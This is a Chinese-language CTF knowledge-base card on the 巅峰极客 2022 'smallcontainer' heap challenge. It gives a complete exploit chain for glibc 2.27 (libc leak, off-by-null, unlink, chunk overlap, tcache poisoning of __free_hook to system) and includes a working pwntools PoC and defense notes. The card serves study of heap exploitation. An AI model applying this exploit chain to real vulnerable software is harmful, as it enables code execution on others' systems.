---
id: binary-pwn-heap-dianfeng-2022-smallcontainer-offby-null-unlink-overlap-tcache-freehook
title: 巅峰极客 2022 smallcontainer：两段 off-by-null 伪造 prev_size/size 触发 unlink 与 chunk overlap，tcache 篡改 __free_hook 为 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: smallcontainer-offby-null-unlink-overlap-tcache-freehook
aliases:
- 巅峰极客 2022 smallcontainer
- off by null unlink
- prev_inuse 清零
- chunk overlap tcache
- __free_hook system
- glibc 2.27 堆题
tags:
- pwn
- heap
- off-by-null
- glibc
- unlink
- tcache
- free-hook
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: glibc 2.27（原文 exp 使用 libc-2.27.so）
verification:
  verified_by: verifier-V679
  verified_at: '2026-11-13T12:15:27+08:00'
  notes: 已对照原文核对：原文 exp 显式使用 libc-2.27.so（final ls 亦可见），已按原文标记 affected_versions=glibc 2.27；泄露（8×0x250 逆序 free、tcache 7 个溢出到 unsorted、切 0x120 后 show 读 main_arena 指针）、两段 off-by-null（edit 8/9 伪造 prev_size=0x310 与 size=0x121、free(9) unlink）、tcache 投毒 __free_hook=system、free('/bin/sh') 与 img09-12 一致；与既有 glibc228/231 off-by-null 卡版本与中间原语不同，append 理由成立。PoC 未本机复跑；edit 偏移的物理布局细节依赖题目堆状态。
---

## 一句话结论

在 glibc 2.27 的菜单堆题（只能申请 0x100-0x3FF）中，先靠 tcache 塞满 7 个块后第 8 个落入 unsorted bin、再申请小块切分并用 show 读出残留的 main_arena 指针泄露 libc；随后布置多组 chunk，用两次 off-by-null 把后一块的 prev_size 伪造成 0x310、清掉其 prev_inuse，并伪造下一块的 size 为 0x121，`free` 时触发向后合并的 unlink，得到覆盖多个块的 chunk overlap；再借重叠块做 tcache 投毒把 `__free_hook` 改成 `system`，最后 `free` 一个内容为 `/bin/sh` 的块拿 shell。

## 原理

- **libc 泄露（无直接堆地址输出时）**：glibc 2.27 的 tcache 每个 size 最多缓存 7 个块。先申请 8 个 0x250 块并全部释放（逆序释放）：前 7 个进 tcache，第 8 个进 unsorted bin。再申请 7 个 0x250 把 tcache 取空，unsorted bin 中的大块仍在；申请 0x120 时从该大块切分，返回块的首个 qword 保留着 free 时写入的 fd（指向 main_arena 的 libc 指针），`show` 直接把它按 hex 打印即可计算 libc 基址（原文用固定 libc-2.27 的偏移换算）。
- **off-by-null 清 prev_inuse**：申请以 0x100 为倍数附近的块（如 0x108、0x200），使可控写入刚好覆盖到下一 chunk 的边界；`edit` 写入时最后一个字节为 `\x00`，把下一 chunk 的 `prev_inuse` 位清 0，让堆管理器认为前一块已释放。
- **伪造 prev_size 与 size 触发 unlink**：把相邻块的 `prev_size` 伪造成跨越多个已释放块的总大小（原文 0x310），并把后续块 size 伪造成 0x121；`free(9)` 时 `consolidate backward` 按伪造的 prev_size 回退到更早的 chunk 并调用 `unlink`，把多个块合并成一个大的 free chunk，同时原 chunk8/9/10 仍在申请表中——形成覆盖它们的 overlap。
- **overlap → tcache 投毒 → __free_hook**：利用重叠块先取得对已释放块 fd 的写权限，把 tcache 链的 fd 改为 `__free_hook - 8`；连续申请同大小块两次后，第二次分配即返回 `__free_hook` 附近，写入 `system`；再让某个块内容为 `/bin/sh`，`free` 时调用 `__free_hook` → `system("/bin/sh")`。
- **为什么成立**：glibc 2.27 的 unlink/合并检查较松（`prev_size` 与 size 一致性检查不严），off-by-null 足以让堆管理器按攻击者伪造的元数据合并；tcache 在 2.27 无 safe-linking（fd 明文），重叠块可直接改写 fd 完成任意分配。

## 触发条件

- glibc 2.27（或相近版本）的堆题，存在可稳定触发的 off-by-null（写入长度 = 申请/可用大小，末字节为 `\x00`），且 add 的 size 范围受限（本题 0x100-0x3FF）迫使使用特定大小的块布局。
- 有 show 功能可读出已释放块残留的 libc 指针；或有其它泄露途径。
- 能控制多组 chunk 的申请/释放顺序，使伪造的 prev_size/size 与 tcache/unsorted bin 状态匹配。
- 目标 libc 版本已知（可用对应 libc-2.27 的符号偏移）。

## 利用步骤

1. **泄露 libc**：`add(0x250)` × 8（index 0-7）→ 逆序 `free(7..0)` → 再 `add(0x250)` × 7 → `add(0x120)`（index 7）→ `show(7)` 读出 fd 残留指针，按 libc-2.27 偏移算出 `libc_base`。
2. **布置第二阶段堆布局**：`add(0x120)`(8)；`free(0..8)`；`add(0x1f0)` × 7（0-6）、`add(0x1f0)`(7)、`add(0x108)`(8)、`add(0x200)`(9)、`add(0x108)`(10)、`add(0x108)`(11)；`free(0..6)`、`free(7)`。
3. **两段 off-by-null**：`edit(8, b'\x11'*0x108)` 后 `edit(8, b'\x11'*0x100 + p16(0x310))` 伪造后续块的 prev_size 并制造空字节写；`edit(9, b'\x00'*0x1f8 + p64(0x121))` 伪造下一块 size 并清 prev_inuse。
4. **触发 unlink/overlap**：`free(9)` 触发向后合并，得到覆盖 chunk8-10 的重叠大块。
5. **投毒 tcache 到 __free_hook**：`free(11)`、`free(8)`；`add(0x300)`(0) 取回重叠块；`edit(0, b'\x00'*0x200 + p64(free_hook - 8))`；`add(0x108)`(1)、(2)；`edit(2, p64(0) + p64(system))`。
6. **getshell**：`edit(1, b'/bin/sh\x00')`；`free(1)` → `system("/bin/sh")`；原文随后 `interactive()`。

## PoC

```python
# 1) libc leak
for i in range(8): add(0x250)
for i in range(7, -1, -1): free(i)
for i in range(7): add(0x250)
add(0x120); show(7)
libc_base = int(p.recv(12), 16) - 0x2c0 - libc.sym['__malloc_hook']   # 原文 libc-2.27 偏移

# 2) layout
add(0x120); [free(i) for i in range(9)]
for i in range(7): add(0x1f0)
add(0x1f0); add(0x108); add(0x200); add(0x108); add(0x108)
for i in range(7): free(i)
free(7)

# 3) off-by-null + fake prev_size/size
edit(8, b'\x11'*0x108)
edit(8, b'\x11'*0x100 + p16(0x310))
edit(9, b'\x00'*0x1f8 + p64(0x121))
free(9)                      # unlink -> overlap

# 4) tcache poison -> free_hook
free(11); free(8)
add(0x300)
edit(0, b'\x00'*0x200 + p64(free_hook - 8))
add(0x108); add(0x108)
edit(2, p64(0) + p64(system))
edit(1, b'/bin/sh\x00'); free(1)
```

原文用 GDB 验证了 overlap 与 free_hook 写入、最终拿到 shell。PoC 未在本机复跑；`0x2c0 + __malloc_hook` 偏移与 libc-2.27 具体版本相关。

## 变体与关联

- [[binary-pwn-heap-glibc228-offby-null-prev-size-unlink-overlap]]：同为 off-by-null → 伪造 prev_size → unlink → overlap → free_hook，但版本/题目与后续原语不同，可对照。
- [[binary-pwn-heap-glibc231-offby-null-no-uaf-overlap-tcache-freehook]]、[[binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop]]：不同 glibc 版本的 off-by-null 链。
- [[binary-pwn-heap-house-of-einherjar-offby-null-fake-chunk-tcache-poison]]、[[binary-pwn-heap-digtal-bomb-offby-null-einherjar-tcache-strlen-got-onegadget]]：off-by-null + tcache 投毒的同族变体。
- 变体：无 show 时可用 unsorted bin 残留指针经其它输出通道泄露；glibc ≥2.29 需处理 tcache key/safe-linking，glibc ≥2.34 后 __free_hook 被移除，需改用 exit_funcs/IO_FILE 等。
- 边界：写入路径若补 `\x00` 后做长度校验、或块布局无法让 prev_size 跨越已释放块，unlink 构造失败。

## 检测与防御

- 代码审计：检查 read/edit 的长度与 chunk 可用大小关系，任何允许写到下一 chunk 头（末字节 `\x00`）的写法都是 off-by-null 风险；对 size 做严格上限并避免把解析后的长度直接当读入长度。
- 编译加固：PIE + Full RELRO + NX + Canary；使用带 safe-linking/tcache key 的新 glibc；移除 hook（glibc ≥2.34）从根本上关闭 __free_hook 目标。
- 检测（CTF/样本）：chunk 的 prev_size/size 与相邻块状态不一致、unlink 后出现重叠分配、tcache fd 指向 libc/非堆地址、__free_hook 被写。
- 说明：本卡为 CTF 完整利用链记录；真实软件中的 off-by-null 需结合具体分配器版本与保护评估。
